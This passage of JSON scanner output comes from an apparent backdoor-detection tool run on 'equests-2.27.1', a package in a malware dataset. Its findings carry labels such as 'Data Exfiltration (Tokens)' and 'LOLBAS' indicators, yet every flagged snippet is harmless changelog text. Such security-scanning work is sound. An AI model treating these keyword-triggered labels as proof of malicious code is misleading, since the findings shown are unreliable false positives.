                  "endColumn": 12,
                  "snippet": {
                    "text": "-   Fixed issue with unexpected `ImportError` on windows system which do\n    not support `winreg` module.\n-   DNS resolution in proxy bypass no longer includes the username and\n    password in the request. This also fixes the issue of DNS queries\n    failing on macOS.\n-   Properly normalize adapter prefixes for url comparison.\n-   Passing `None` as a file pointer to the `files` param no longer\n",
                    "rendered": {
                      "text": "-   Fixed issue with unexpected `ImportError` on windows system which do\n    not support `winreg` module.\n-   DNS resolution in proxy bypass no longer includes the username and\n    password in the request. This also fixes the issue of DNS queries\n    failing on macOS.\n-   Properly normalize adapter prefixes for url comparison.\n-   Passing `None` as a file pointer to the `files` param no longer\n",
                      "markdown": "`-   Fixed issue with unexpected `ImportError` on windows system which do\n    not support `winreg` module.\n-   DNS resolution in proxy bypass no longer includes the username and\n    password in the request. This also fixes the issue of DNS queries\n    failing on macOS.\n-   Properly normalize adapter prefixes for url comparison.\n-   Passing `None` as a file pointer to the `files` param no longer\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 29,
                  "endLine": 162,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n**Bugfixes**\n\n- Requests no longer outputs password in basic auth usage warning. (#5099)\n\n**Dependencies**\n\n",
                    "rendered": {
                      "text": "\n**Bugfixes**\n\n- Requests no longer outputs password in basic auth usage warning. (#5099)\n\n**Dependencies**\n\n",
                      "markdown": "`\n**Bugfixes**\n\n- Requests no longer outputs password in basic auth usage warning. (#5099)\n\n**Dependencies**\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 884,
                  "startColumn": 25,
                  "endLine": 884,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    ([shazow/urllib3\\#549](https://github.com/shazow/urllib3/pull/549))\n-   Fix multiple `Set-Cookie` headers properly.\n    ([shazow/urllib3\\#534](https://github.com/shazow/urllib3/pull/534))\n-   Disable the built-in hostname verification.\n    ([shazow/urllib3\\#526](https://github.com/shazow/urllib3/pull/526))\n-   Fix the behaviour of decoding an exhausted stream.\n    ([shazow/urllib3\\#535](https://github.com/shazow/urllib3/pull/535))\n",
                    "rendered": {
                      "text": "    ([shazow/urllib3\\#549](https://github.com/shazow/urllib3/pull/549))\n-   Fix multiple `Set-Cookie` headers properly.\n    ([shazow/urllib3\\#534](https://github.com/shazow/urllib3/pull/534))\n-   Disable the built-in hostname verification.\n    ([shazow/urllib3\\#526](https://github.com/shazow/urllib3/pull/526))\n-   Fix the behaviour of decoding an exhausted stream.\n    ([shazow/urllib3\\#535](https://github.com/shazow/urllib3/pull/535))\n",
                      "markdown": "`    ([shazow/urllib3\\#549](https://github.com/shazow/urllib3/pull/549))\n-   Fix multiple `Set-Cookie` headers properly.\n    ([shazow/urllib3\\#534](https://github.com/shazow/urllib3/pull/534))\n-   Disable the built-in hostname verification.\n    ([shazow/urllib3\\#526](https://github.com/shazow/urllib3/pull/526))\n-   Fix the behaviour of decoding an exhausted stream.\n    ([shazow/urllib3\\#535](https://github.com/shazow/urllib3/pull/535))\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 829,
                  "startColumn": 50,
                  "endLine": 829,
                  "endColumn": 58,
                  "snippet": {
                    "text": "**Bugfixes**\n\n-   CVE-2015-2296: Fix handling of cookies on redirect. Previously a\n    cookie without a host value set would use the hostname for the\n    redirected URL exposing requests users to session fixation attacks\n    and potentially cookie stealing. This was disclosed privately by\n    Matthew Daley of [BugFuzz](https://bugfuzz.com). This affects all\n",
                    "rendered": {
                      "text": "**Bugfixes**\n\n-   CVE-2015-2296: Fix handling of cookies on redirect. Previously a\n    cookie without a host value set would use the hostname for the\n    redirected URL exposing requests users to session fixation attacks\n    and potentially cookie stealing. This was disclosed privately by\n    Matthew Daley of [BugFuzz](https://bugfuzz.com). This affects all\n",
                      "markdown": "`**Bugfixes**\n\n-   CVE-2015-2296: Fix handling of cookies on redirect. Previously a\n    cookie without a host value set would use the hostname for the\n    redirected URL exposing requests users to session fixation attacks\n    and potentially cookie stealing. This was disclosed privately by\n    Matthew Daley of [BugFuzz](https://bugfuzz.com). This affects all\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 755,
                  "startColumn": 19,
                  "endLine": 755,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n-   Requests now supports per-host proxies. This allows the `proxies`\n    dictionary to have entries of the form\n    `{'<scheme>://<hostname>': '<proxy>'}`. Host-specific proxies will\n    be used in preference to the previously-supported scheme-specific\n    ones, but the previous syntax will continue to work.\n-   `Response.raise_for_status` now prints the URL that failed as part\n",
                    "rendered": {
                      "text": "\n-   Requests now supports per-host proxies. This allows the `proxies`\n    dictionary to have entries of the form\n    `{'<scheme>://<hostname>': '<proxy>'}`. Host-specific proxies will\n    be used in preference to the previously-supported scheme-specific\n    ones, but the previous syntax will continue to work.\n-   `Response.raise_for_status` now prints the URL that failed as part\n",
                      "markdown": "`\n-   Requests now supports per-host proxies. This allows the `proxies`\n    dictionary to have entries of the form\n    `{'<scheme>://<hostname>': '<proxy>'}`. Host-specific proxies will\n    be used in preference to the previously-supported scheme-specific\n    ones, but the previous syntax will continue to work.\n-   `Response.raise_for_status` now prints the URL that failed as part\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 206,
                  "startColumn": 35,
                  "endLine": 206,
                  "endColumn": 43,
                  "snippet": {
                    "text": "-   Fixed exception leak where certain redirect urls would raise\n    uncaught urllib3 exceptions.\n-   Requests removes Authorization header from requests redirected\n    from https to http on the same hostname. (CVE-2018-18074)\n-   `should_bypass_proxies` now handles URIs without hostnames (e.g.\n    files).\n\n",
                    "rendered": {
                      "text": "-   Fixed exception leak where certain redirect urls would raise\n    uncaught urllib3 exceptions.\n-   Requests removes Authorization header from requests redirected\n    from https to http on the same hostname. (CVE-2018-18074)\n-   `should_bypass_proxies` now handles URIs without hostnames (e.g.\n    files).\n\n",
                      "markdown": "`-   Fixed exception leak where certain redirect urls would raise\n    uncaught urllib3 exceptions.\n-   Requests removes Authorization header from requests redirected\n    from https to http on the same hostname. (CVE-2018-18074)\n-   `should_bypass_proxies` now handles URIs without hostnames (e.g.\n    files).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1213,
                  "startColumn": 3,
                  "endLine": 1213,
                  "endColumn": 11,
                  "snippet": {
                    "text": "-   Fix `RequestsCookieJar`\n-   Sessions and Adapters are now picklable, i.e., can be used with the\n    multiprocessing library\n-   Update charade to version 1.0.3\n\nThe change in how hooks are dispatched will likely cause a great deal of\nissues.\n",
                    "rendered": {
                      "text": "-   Fix `RequestsCookieJar`\n-   Sessions and Adapters are now picklable, i.e., can be used with the\n    multiprocessing library\n-   Update charade to version 1.0.3\n\nThe change in how hooks are dispatched will likely cause a great deal of\nissues.\n",
                      "markdown": "`-   Fix `RequestsCookieJar`\n-   Sessions and Adapters are now picklable, i.e., can be used with the\n    multiprocessing library\n-   Update charade to version 1.0.3\n\nThe change in how hooks are dispatched will likely cause a great deal of\nissues.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1203,
                  "startColumn": 3,
                  "endLine": 1203,
                  "endColumn": 11,
                  "snippet": {
                    "text": "-   Major proxy work thanks to @Lukasa including parsing of proxy\n    authentication from the proxy url\n-   Fix DigestAuth handling too many 401s\n-   Update vendored urllib3 to include SSL bug fixes\n-   Allow keyword arguments to be passed to `json.loads()` via the\n    `Response.json()` method\n-   Don't send `Content-Length` header by default on `GET` or `HEAD`\n",
                    "rendered": {
                      "text": "-   Major proxy work thanks to @Lukasa including parsing of proxy\n    authentication from the proxy url\n-   Fix DigestAuth handling too many 401s\n-   Update vendored urllib3 to include SSL bug fixes\n-   Allow keyword arguments to be passed to `json.loads()` via the\n    `Response.json()` method\n-   Don't send `Content-Length` header by default on `GET` or `HEAD`\n",
                      "markdown": "`-   Major proxy work thanks to @Lukasa including parsing of proxy\n    authentication from the proxy url\n-   Fix DigestAuth handling too many 401s\n-   Update vendored urllib3 to include SSL bug fixes\n-   Allow keyword arguments to be passed to `json.loads()` via the\n    `Response.json()` method\n-   Don't send `Content-Length` header by default on `GET` or `HEAD`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 942,
                  "startColumn": 3,
                  "endLine": 942,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\n-   Add more references for interlinking (\\#2348)\n-   Update CSS for theme (\\#2290)\n-   Update width of buttons and sidebar (\\#2289)\n-   Replace references of Gittip with Gratipay (\\#2282)\n-   Add link to changelog in sidebar (\\#2273)\n\n",
                    "rendered": {
                      "text": "\n-   Add more references for interlinking (\\#2348)\n-   Update CSS for theme (\\#2290)\n-   Update width of buttons and sidebar (\\#2289)\n-   Replace references of Gittip with Gratipay (\\#2282)\n-   Add link to changelog in sidebar (\\#2273)\n\n",
                      "markdown": "`\n-   Add more references for interlinking (\\#2348)\n-   Update CSS for theme (\\#2290)\n-   Update width of buttons and sidebar (\\#2289)\n-   Replace references of Gittip with Gratipay (\\#2282)\n-   Add link to changelog in sidebar (\\#2273)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 941,
                  "startColumn": 3,
                  "endLine": 941,
                  "endColumn": 11,
                  "snippet": {
                    "text": "**Documentation**\n\n-   Add more references for interlinking (\\#2348)\n-   Update CSS for theme (\\#2290)\n-   Update width of buttons and sidebar (\\#2289)\n-   Replace references of Gittip with Gratipay (\\#2282)\n-   Add link to changelog in sidebar (\\#2273)\n",
                    "rendered": {
                      "text": "**Documentation**\n\n-   Add more references for interlinking (\\#2348)\n-   Update CSS for theme (\\#2290)\n-   Update width of buttons and sidebar (\\#2289)\n-   Replace references of Gittip with Gratipay (\\#2282)\n-   Add link to changelog in sidebar (\\#2273)\n",
                      "markdown": "`**Documentation**\n\n-   Add more references for interlinking (\\#2348)\n-   Update CSS for theme (\\#2290)\n-   Update width of buttons and sidebar (\\#2289)\n-   Replace references of Gittip with Gratipay (\\#2282)\n-   Add link to changelog in sidebar (\\#2273)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 739,
                  "startColumn": 3,
                  "endLine": 739,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\n**Bugfixes**\n\n-   Update certificate bundle to match `certifi` 2015.9.6.2's weak\n    certificate bundle.\n-   Fix a bug in 2.8.0 where requests would raise `ConnectTimeout`\n    instead of `ConnectionError`\n",
                    "rendered": {
                      "text": "\n**Bugfixes**\n\n-   Update certificate bundle to match `certifi` 2015.9.6.2's weak\n    certificate bundle.\n-   Fix a bug in 2.8.0 where requests would raise `ConnectTimeout`\n    instead of `ConnectionError`\n",
                      "markdown": "`\n**Bugfixes**\n\n-   Update certificate bundle to match `certifi` 2015.9.6.2's weak\n    certificate bundle.\n-   Fix a bug in 2.8.0 where requests would raise `ConnectTimeout`\n    instead of `ConnectionError`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 726,
                  "startColumn": 32,
                  "endLine": 726,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    garbage collector to clean them up.\n-   Correctly handle digest auth headers with a malformed `qop`\n    directive that contains no token, by treating it the same as if no\n    `qop` directive was provided at all.\n-   Minor performance improvements when removing specific cookies by\n    name.\n\n",
                    "rendered": {
                      "text": "    garbage collector to clean them up.\n-   Correctly handle digest auth headers with a malformed `qop`\n    directive that contains no token, by treating it the same as if no\n    `qop` directive was provided at all.\n-   Minor performance improvements when removing specific cookies by\n    name.\n\n",
                      "markdown": "`    garbage collector to clean them up.\n-   Correctly handle digest auth headers with a malformed `qop`\n    directive that contains no token, by treating it the same as if no\n    `qop` directive was provided at all.\n-   Minor performance improvements when removing specific cookies by\n    name.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 455,
                  "startColumn": 66,
                  "endLine": 456,
                  "snippet": {
                    "text": "    dictionary to provide handling similar to the `NO_PROXY` environment\n    variable.\n-   When users provide invalid paths to certificate bundle files or\n    directories Requests now raises `IOError`, rather than failing at\n    the time of the HTTPS request with a fairly inscrutable certificate\n    validation error.\n-   The behavior of `SessionRedirectMixin` was slightly altered.\n    `resolve_redirects` will now detect a redirect by calling\n",
                    "rendered": {
                      "text": "    dictionary to provide handling similar to the `NO_PROXY` environment\n    variable.\n-   When users provide invalid paths to certificate bundle files or\n    directories Requests now raises `IOError`, rather than failing at\n    the time of the HTTPS request with a fairly inscrutable certificate\n    validation error.\n-   The behavior of `SessionRedirectMixin` was slightly altered.\n    `resolve_redirects` will now detect a redirect by calling\n",
                      "markdown": "`    dictionary to provide handling similar to the `NO_PROXY` environment\n    variable.\n-   When users provide invalid paths to certificate bundle files or\n    directories Requests now raises `IOError`, rather than failing at\n    the time of the HTTPS request with a fairly inscrutable certificate\n    validation error.\n-   The behavior of `SessionRedirectMixin` was slightly altered.\n    `resolve_redirects` will now detect a redirect by calling\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 390,
                  "startColumn": 5,
                  "endLine": 390,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n**Note**: code that was written to import against the\n`requests.packages` namespace previously will have to import code that\nrests at this module-level now.\n\nFor example:\n\n",
                    "rendered": {
                      "text": "\n**Note**: code that was written to import against the\n`requests.packages` namespace previously will have to import code that\nrests at this module-level now.\n\nFor example:\n\n",
                      "markdown": "`\n**Note**: code that was written to import against the\n`requests.packages` namespace previously will have to import code that\nrests at this module-level now.\n\nFor example:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1536,
                  "startColumn": 10,
                  "endLine": 1536,
                  "endColumn": 19,
                  "snippet": {
                    "text": "0.8.6 (2011-12-18)\n------------------\n\n-   Socket timeout fixes.\n-   Proxy Authorization support.\n\n0.8.5 (2011-12-14)\n",
                    "rendered": {
                      "text": "0.8.6 (2011-12-18)\n------------------\n\n-   Socket timeout fixes.\n-   Proxy Authorization support.\n\n0.8.5 (2011-12-14)\n",
                      "markdown": "`0.8.6 (2011-12-18)\n------------------\n\n-   Socket timeout fixes.\n-   Proxy Authorization support.\n\n0.8.5 (2011-12-14)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1447,
                  "startColumn": 3,
                  "endLine": 1447,
                  "endColumn": 9,
                  "snippet": {
                    "text": "0.10.3 (2012-02-20)\n-------------------\n\n-   HEAD requests don't follow redirects anymore.\n-   raise\\_for\\_status() doesn't raise for 3xx anymore.\n-   Make Session objects picklable.\n-   ValueError for invalid schema URLs.\n",
                    "rendered": {
                      "text": "0.10.3 (2012-02-20)\n-------------------\n\n-   HEAD requests don't follow redirects anymore.\n-   raise\\_for\\_status() doesn't raise for 3xx anymore.\n-   Make Session objects picklable.\n-   ValueError for invalid schema URLs.\n",
                      "markdown": "`0.10.3 (2012-02-20)\n-------------------\n\n-   HEAD requests don't follow redirects anymore.\n-   raise\\_for\\_status() doesn't raise for 3xx anymore.\n-   Make Session objects picklable.\n-   ValueError for invalid schema URLs.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1411,
                  "startColumn": 27,
                  "endLine": 1411,
                  "endColumn": 36,
                  "snippet": {
                    "text": "-   Private SSL Certificate support\n-   Remove select.poll from Gevent monkeypatching\n-   Remove redundant generator for chunked transfer encoding\n-   Fix: Response.ok raises Timeout Exception in safe\\_mode\n\n0.10.8 (2012-03-09)\n-------------------\n",
                    "rendered": {
                      "text": "-   Private SSL Certificate support\n-   Remove select.poll from Gevent monkeypatching\n-   Remove redundant generator for chunked transfer encoding\n-   Fix: Response.ok raises Timeout Exception in safe\\_mode\n\n0.10.8 (2012-03-09)\n-------------------\n",
                      "markdown": "`-   Private SSL Certificate support\n-   Remove select.poll from Gevent monkeypatching\n-   Remove redundant generator for chunked transfer encoding\n-   Fix: Response.ok raises Timeout Exception in safe\\_mode\n\n0.10.8 (2012-03-09)\n-------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1395,
                  "startColumn": 3,
                  "endLine": 1395,
                  "endColumn": 9,
                  "snippet": {
                    "text": "-   Multi-part file upload improvements.\n-   Fix decoding of invalid %encodings in URLs.\n-   If there is no content in a response don't throw an error the second\n    time that content is attempted to be read.\n-   Upload data on redirects.\n\n0.11.1 (2012-03-30)\n",
                    "rendered": {
                      "text": "-   Multi-part file upload improvements.\n-   Fix decoding of invalid %encodings in URLs.\n-   If there is no content in a response don't throw an error the second\n    time that content is attempted to be read.\n-   Upload data on redirects.\n\n0.11.1 (2012-03-30)\n",
                      "markdown": "`-   Multi-part file upload improvements.\n-   Fix decoding of invalid %encodings in URLs.\n-   If there is no content in a response don't throw an error the second\n    time that content is attempted to be read.\n-   Upload data on redirects.\n\n0.11.1 (2012-03-30)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1208,
                  "startColumn": 52,
                  "endLine": 1208,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    `Response.json()` method\n-   Don't send `Content-Length` header by default on `GET` or `HEAD`\n    requests\n-   Add `elapsed` attribute to `Response` objects to time how long a\n    request took.\n-   Fix `RequestsCookieJar`\n-   Sessions and Adapters are now picklable, i.e., can be used with the\n",
                    "rendered": {
                      "text": "    `Response.json()` method\n-   Don't send `Content-Length` header by default on `GET` or `HEAD`\n    requests\n-   Add `elapsed` attribute to `Response` objects to time how long a\n    request took.\n-   Fix `RequestsCookieJar`\n-   Sessions and Adapters are now picklable, i.e., can be used with the\n",
                      "markdown": "`    `Response.json()` method\n-   Don't send `Content-Length` header by default on `GET` or `HEAD`\n    requests\n-   Add `elapsed` attribute to `Response` objects to time how long a\n    request took.\n-   Fix `RequestsCookieJar`\n-   Sessions and Adapters are now picklable, i.e., can be used with the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1123,
                  "startColumn": 30,
                  "endLine": 1123,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    versions, i.e. bytestrings on Python 2, unicode on Python 3.\n-   Proxy URLs now *must* have an explicit scheme. A `MissingSchema`\n    exception will be raised if they don't.\n-   Timeouts now apply to read time if `Stream=False`.\n-   `RequestException` is now a subclass of `IOError`, not\n    `RuntimeError`.\n-   Added new method to `PreparedRequest` objects:\n",
                    "rendered": {
                      "text": "    versions, i.e. bytestrings on Python 2, unicode on Python 3.\n-   Proxy URLs now *must* have an explicit scheme. A `MissingSchema`\n    exception will be raised if they don't.\n-   Timeouts now apply to read time if `Stream=False`.\n-   `RequestException` is now a subclass of `IOError`, not\n    `RuntimeError`.\n-   Added new method to `PreparedRequest` objects:\n",
                      "markdown": "`    versions, i.e. bytestrings on Python 2, unicode on Python 3.\n-   Proxy URLs now *must* have an explicit scheme. A `MissingSchema`\n    exception will be raised if they don't.\n-   Timeouts now apply to read time if `Stream=False`.\n-   `RequestException` is now a subclass of `IOError`, not\n    `RuntimeError`.\n-   Added new method to `PreparedRequest` objects:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/HISTORY.md"
                },
                "region": {
                  "startLine": 1087,
                  "startColumn": 15,
                  "endLine": 1087,
                  "endColumn": 19,
                  "snippet": {
                    "text": "-   Fix previously broken SNI support.\n-   Fix accessing HTTP proxies using proxy authentication.\n-   Unencode HTTP Basic usernames and passwords extracted from URLs.\n-   Support for IP address ranges for no\\_proxy environment variable\n-   Parse headers correctly when users override the default `Host:`\n    header.\n-   Avoid munging the URL in case of case-sensitive servers.\n",
                    "rendered": {
                      "text": "-   Fix previously broken SNI support.\n-   Fix accessing HTTP proxies using proxy authentication.\n-   Unencode HTTP Basic usernames and passwords extracted from URLs.\n-   Support for IP address ranges for no\\_proxy environment variable\n-   Parse headers correctly when users override the default `Host:`\n    header.\n-   Avoid munging the URL in case of case-sensitive servers.\n",
                      "markdown": "`-   Fix previously broken SNI support.\n-   Fix accessing HTTP proxies using proxy authentication.\n-   Unencode HTTP Basic usernames and passwords extracted from URLs.\n-   Support for IP address ranges for no\\_proxy environment variable\n-   Parse headers correctly when users override the default `Host:`\n    header.\n-   Avoid munging the URL in case of case-sensitive servers.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
